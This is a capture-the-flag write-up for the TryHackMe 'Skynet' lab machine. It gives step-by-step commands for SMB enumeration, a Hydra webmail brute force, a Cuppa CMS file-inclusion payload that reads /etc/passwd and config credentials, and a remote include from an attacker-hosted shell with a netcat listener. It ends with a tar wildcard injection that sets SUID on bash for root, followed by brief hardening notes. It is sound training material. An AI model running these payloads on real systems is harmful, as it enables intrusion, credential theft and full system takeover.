# Skynet — Write-up

Deploy and compromise the target machine to retrieve the user and root flags.

**Difficulty:** Easy 🟢  
**Platform:** TryHackMe · **Level:** Easy · **Category:** Web

> **Description:** A vulnerable Terminator-themed Linux machine.

## Executive Summary

Initial access was achieved via **anonymous SMB enumeration**, which exposed a **password wordlist**. That wordlist was used to perform a credential attack against **SquirrelMail**, granting access to **milesdyson**'s mailbox and yielding additional credentials for the **milesdyson SMB share**. Inside the share, a note revealed a **hidden CMS directory**. The CMS (Cuppa CMS) was then tested and confirmed vulnerable to **Local File Inclusion (LFI) / Arbitrary File Read** via the `urlConfig` parameter, allowing retrieval of `Configuration.php` (including credentials and secrets). Code execution was obtained by including remotely hosted content through the same parameter (conditional on PHP/environment settings), resulting in a `www-data` shell. Privilege escalation was achieved through a **root cron job** running `tar` with a wildcard, exploited via `--checkpoint-action` option injection, resulting in a root shell and final flag access.

## Mission Objectives

In this laboratory, the following questions must be answered:

- What is Miles' email password?
- What is the hidden directory?
- What is the vulnerability called when a remote file can be included for malicious purposes?
- **User Flag:** `THM{...}`
- **Root Flag:** `THM{...}`

```bash
export TARGET_IP=<tryhackme_machine_ip>
```

---

## Enumeration

### Nmap Scan Results

The initial scan reveals several open ports, indicating a relatively large attack surface:

```bash
nmap -sS -sV -T4 --top-ports 10000 $TARGET_IP

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-27 15:44 -0300
Nmap scan report for 10.64.185.128
Host is up (0.15s latency).
Not shown: 8374 closed tcp ports (reset)

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Potential Entry Points

The presence of SMB and email-related services (POP3/IMAP) suggests a common attack pattern for this machine. As an initial approach, SMB shares should be enumerated to determine whether anonymous or guest access is enabled.

---

## SMB Enumeration

### Listing SMB Shares

```bash
smbclient -L //$TARGET_IP/

Password for [WORKGROUP\attack]:

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

Reconnecting with SMB1 for workgroup listing.

Server               Comment
---------            -------

Workgroup            Master
---------            -------
WORKGROUP            SKYNET
```

#### Findings

- `anonymous`: An SMB share explicitly labeled as an anonymous share. This is likely to contain useful information.
- `milesdyson`: A personal share belonging to Miles Dyson; access likely requires valid credentials.

### Accessing the Anonymous Share

```bash
smbclient //$TARGET_IP/anonymous

Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.

smb: \> ls
.                                   D        0  Thu Nov 26 13:04:00 2020
..                                  D        0  Tue Sep 17 04:20:17 2019
attention.txt                       N      163  Wed Sep 18 00:04:59 2019
logs                                D        0  Wed Sep 18 01:42:16 2019

9204224 blocks of size 1024. 5831484 blocks available
```

Downloading the files:

```bash
smb: \> get attention.txt

smb: \> cd logs\
smb: \logs\> ls

log2.txt                            N        0  Wed Sep 18 01:42:13 2019
log1.txt                            N      471  Wed Sep 18 01:41:59 2019
log3.txt                            N        0  Wed Sep 18 01:42:16 2019

smb: \logs\> get log1.txt
```

#### File Content

> attention.txt
```text
A recent system malfunction has caused various passwords to be changed. 
All skynet employees are required to change their password after seeing this.

-Miles Dyson
```

> log1.txt
```text
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

#### Analysis

- `attention.txt` indicates employee passwords were recently changed.
- `log1.txt` appears to be a password wordlist related to those changes.
- This wordlist is suitable for credential testing against webmail and other exposed services.

---

## Web Enumeration

### Directory Brute-Forcing (Gobuster)

To identify hidden directories and web applications, directory brute forcing was performed against the web server.

```bash
gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     http://10.64.185.128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/admin                (Status: 301) [--> /admin/]
/config               (Status: 301) [--> /config/]
/css                  (Status: 301) [--> /css/]
/index.html           (Status: 200)
/js                   (Status: 301) [--> /js/]
/server-status        (Status: 403)
/squirrelmail         (Status: 301) [--> /squirrelmail/]
===============================================================
Finished
===============================================================
```

#### Key Findings

- `/squirrelmail`: A web-based email client (SquirrelMail), confirming an exposed webmail login interface.
- `/admin` and `/config`: Standard directories; not used as the primary path in this engagement.

---

## Credential Attack — SquirrelMail

### Brute-Forcing Webmail Credentials (Hydra)

Using the username `milesdyson` and the wordlist obtained from SMB, a credential attack was performed against the SquirrelMail login endpoint:

```bash
hydra -l milesdyson -P log1.txt $TARGET_IP http-post-form \
"/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect"

Hydra v9.6 (c) 2023 by van Hauser/THC

[DATA] attacking http-post-form://10.64.185.128:80/squirrelmail/src/redirect.php
[80][http-post-form] host: 10.64.185.128   login: milesdyson   password: cyborg007haloterminator

1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2025-12-27 18:22:14
```

#### Valid Credentials Discovered

- Username: `milesdyson`
- Password: `cyborg007haloterminator`

### Accessing the Webmail Interface

```text
http://<TARGET_IP>/squirrelmail/src/webmail.php
```

---

## Email Enumeration — SquirrelMail

After successfully authenticating to SquirrelMail, access to Miles Dyson’s mailbox was obtained.

### Inbox Evidence

<img src="./images/image-1.png" alt="SquirrelMail inbox view" width="1200">

### Email Evidence (SMB credentials)

<img src="./images/image-2.png" alt="Email revealing SMB password" width="1200">

> Note: The screenshots above document the mailbox access and the message containing SMB-related credentials used in the next step.

---

## SMB Enumeration — Miles Dyson Share

Using the credentials obtained from the email, authenticated access to Miles Dyson’s personal SMB share was possible.

```bash
smbclient -U milesdyson //$TARGET_IP/milesdyson

smb: \> ls
Improving Deep Neural Networks.pdf
Natural Language Processing-Building Sequence Models.pdf
Convolutional Neural Networks-CNN.pdf
Neural Networks and Deep Learning.pdf
Structuring your Machine Learning Project.pdf
notes/
```

Exploring the `notes/` directory:

```bash
smb: \> cd notes
smb: \notes\> ls
important.txt
get important.txt
```

```bash
cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

---

## Hidden Web Directory Discovered

The file reveals a hidden CMS directory:

```text
http://<TARGET_IP>/45kra24zxs28v3yd/
```

<img src="./images/image-3.png" alt="Hidden CMS directory" width="1200">

---

## CMS Enumeration

### Directory Enumeration — Hidden CMS

```bash
gobuster dir -u http://$TARGET_IP/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.8
===============================================================
[+] Url:                     http://10.64.185.128/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [--> /administrator/]
/index.html           (Status: 200)
===============================================================
Finished
===============================================================
```

### Administrator Panel Identified

```text
http://<TARGET_IP>/45kra24zxs28v3yd/administrator/
```

<img src="./images/image-4.png" alt="CMS administrator login page" width="1000">

---

## Vulnerability Identification — Cuppa CMS

The administrator panel indicates the application is running **Cuppa CMS**.

<details>
<summary><strong>Exploit discovery (searchsploit)</strong></summary>

```bash
searchsploit cuppa cms
```

```bash
searchsploit -m php/webapps/25971.txt
```

</details>

---

## Local File Inclusion (LFI) / Arbitrary File Read

An LFI / arbitrary file read issue was identified in `alertConfigField.php`, where the application includes server-side files based on the user-controlled `urlConfig` parameter without sufficient validation.

### Proof of Concept — Local File Read (`/etc/passwd`)

```text
http://<TARGET_IP>/administrator/alerts/alertConfigField.php?urlConfig=/etc/passwd
```

<img src="./images/Captura de tela_2025-12-28_10-17-28.png" alt="/etc/passwd" width="1200">

### Proof of Concept — Safe Read via `php://filter`

```text
http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

<img src="./images/configphp.png" alt="config.php" width="1200">

Decoded content (as obtained):

```bash
echo "PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==" | base64 -d
```

```php
<?php 
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "password123";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        } 
?>
```

### Impact

- Disclosure of database credentials (`root:password123`)
- Exposure of an application token
- Identification of the upload directory (`media/uploadsFiles`)
- Confirmation that sensitive backend files are readable due to insufficient input handling

---

## Exploitation — Remote Include Leading to Code Execution (Environment-Dependent)

This step uses remote inclusion through the same vulnerable parameter to execute a hosted PHP payload. Whether this works depends on PHP/environment configuration; in this lab it resulted in code execution.

### 1) Preparation & Listener Setup

Host the payload:

```bash
python3 -m http.server 8000
```

Start the listener:

```bash
nc -lvnp 1234
```

### 2) Execution

```text
http://<TARGET_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER_IP>:8000/shell.txt
```

### 3) Shell Stabilization

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/$ cd /home/milesdyson
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
FLAG = [REDACTED]
```

---

## Privilege Escalation

After obtaining a `www-data` shell, cron jobs were checked for privileged scheduled tasks.

### Checking Scheduled Tasks (Cron Jobs)

```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

### Inspecting the Script and Permissions

```bash
www-data@skynet:/home/milesdyson/backups$ ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Dec 28 10:06 backup.tgz
```

Script content:

```bash
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

**Why this is exploitable:** `tar` will parse arguments that begin with `--` as options. Since `*` is expanded by the shell into file names in `/var/www/html`, creating files with names that look like `tar` options allows option injection when the cron job runs as root.

### Confirming Write Access to the Target Directory

```bash
www-data@skynet:/var/www/html$ ls -la
total 68
drwxr-xr-x 8 www-data www-data  4096 Nov 26  2020 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
```

### Payload Creation

```bash
www-data@skynet:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
```

### Creating Malicious Filenames (tar option injection)

```bash
www-data@skynet:/var/www/html$ touch ./"--checkpoint=1"
```

```bash
www-data@skynet:/var/www/html$ touch ./"--checkpoint-action=exec=sh exploit.sh"
```

### Gaining Root Access

After the cron job executed, `/bin/bash` had the SUID bit set:

```bash
www-data@skynet:/var/www/html$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

Root shell:

```bash
www-data@skynet:/var/www/html$ /bin/bash -p
bash-4.3#
```

Final flag:

```bash
cat /root/root.txt
# Flag: [REDACTED]
```

---

## Answers

- **What is Miles' email password?** `cyborg007haloterminator`
- **What is the hidden directory?** `/45kra24zxs28v3yd/`
- **What is the vulnerability called when a remote file can be included for malicious purposes?** Remote File Inclusion (RFI) *(general term; the confirmed issue demonstrated here is LFI/Arbitrary File Read, and remote inclusion worked in this lab environment)*
- **User Flag:** `THM{...}` *(redacted)*
- **Root Flag:** `THM{...}` *(redacted)*

---

## Hardening Notes (Brief)

- Disable or restrict **anonymous SMB** and enforce least-privilege share permissions.
- Reduce exposed services (webmail) and avoid storing credentials in email content.
- Patch/replace vulnerable CMS components and validate any file include functionality.
- Review PHP configuration that enables URL-based includes (where applicable).
- Avoid privileged cron jobs that run `tar ... *` over attacker-writable directories; use controlled file lists and safe argument handling.
- Audit file permissions for web roots and other directories writable by service accounts.

---

Written by Nelson Hirt
